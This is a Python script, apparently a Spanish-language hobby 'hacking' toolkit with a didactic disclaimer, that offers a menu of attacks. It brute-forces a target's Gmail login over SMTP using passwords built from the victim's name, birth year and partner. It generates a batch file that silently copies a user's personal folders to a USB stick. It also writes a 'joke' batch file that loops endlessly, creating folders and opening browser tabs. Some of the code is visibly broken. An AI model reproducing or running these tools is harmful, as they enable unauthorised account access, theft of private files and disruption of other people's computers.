#-*- coding: utf-8 -*-
# no me hago responsable de lo que se haga con este programa, este software está hecho con fines didacticos.
import smtplib
import subprocess
import getpass
import os

def filefactory(msg, content):
	subprocess.call(["cmd.exe","/c","cls"])
	print('''{}'''.format(msg))
	getpass.getpass("presione enter para continuar...")
	subprocess.call(["cmd.exe","/c","cls"])
	filename = str(raw_input("introduzca el nombre del archivo (no agregue el .bat): "))
	filename += ".bat"
	file = open(filename, "w")
	file.write('''{}'''.format(content))
	file.close


def bforce():
	data = ["123456","12345678","qwerty", "Password", "password", "123456789"]
	subprocess.call(["cmd.exe","/c","cls"])
	print("este algoritmo solo funciona con correos de gmail.")
	email = str(raw_input("introduce el corre electronico de el objetivo: "))
	name = str(raw_input("introduce el nombre de el objetivo: "))
	data.append(name)
	year = str(raw_input("introduce el año de nacimeinto de {}: ".format(name)))
	data.append(year)
	cpl = str(raw_input("{} tiene pareja? Y/N: ".format(name)))
	if cpl == "y" or cpl == "Y":
		couple = str(raw_input("como se llama la pareja de {}?: ".format(name)))
		data.append(couple)
		anniversary = str(raw_input)
		data.append(anniversary)
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	for passw in data:
		for passw2 in data:
			rpass = passw + passw2
			try:
				server.login(email, rpass)
			except Exception as e:
				print("{} probablemente no es la clave de {}".format(rpass, email))
				print("")
			else:
				print("{} es la clave de {}".format(rpass, email))
				break
	getpass.getpass("presione enter para continuar...")

def run():
	do = str()
	while do != 'exit':
		subprocess.call(["cmd.exe","/c","cls"])
		do = str(raw_input('''
			*************************
			[f]uerza bruta
			[s]pyware
			[j]oke malware
			[c]onfiguracion
			-------------------------
			para salir escribe "exit"
			*************************
            
            > '''))
		if do == "f":
			bforce()
		elif do == "s":
			msg = '''
			se va a crear un archivo.bat con un programa para copiar archivos desde una usb...
            para que esto funcione debe de tener una usb con una carpeta llamada 'sofia'
            la cual se encuentre en el mismo directorio que el archivo que esta a punto de crearse
            en la ruta {}'''.format(os.getcwd())
            #la carpeta se llama sofia en honor al virus para MS-DOS del mismo nombre
            content = '''
@echo off
copy C:\Users\%USERNAME%\Pictures\*.* .\sofia\
copy C:\Users\%USERNAME%\Destkop\*.* .\sofia\
copy C:\Users\%USERNAME%\Downloads\*.* .\sofia\
copy C:\Users\%USERNAME%\Documents\*.*.\sofia\
copy C:\Users\%USERNAME%\Videos\*.*.\sofia\
copy C:\Users\%USERNAME%\Music\*.* .\sofia\ '''
            filefactory(msg, content)
        elif do == "j":
        	msg = "de momento solo hay un virus joke porque es muy tarde"
        	content = '''
@echo off 
c: 
cd C:\Users\%USERNAME%\Desktop 
:loop1 
MD soyununicornio%random% 
echo soy un unicornio
start https://es.wikipedia.org/wiki/Unicornio
color 20 
color 30 
color 40 
color 50 
color E0  
goto loop2 
:loop2 
goto loop1 

        	'''
        	filefactory(msg, content)
        elif do == "c":
        	print("esto lo voy a crear mañana")
        	getpass.getpass("presione enter para continuar")

if __name__ == '__main__':
	run()


	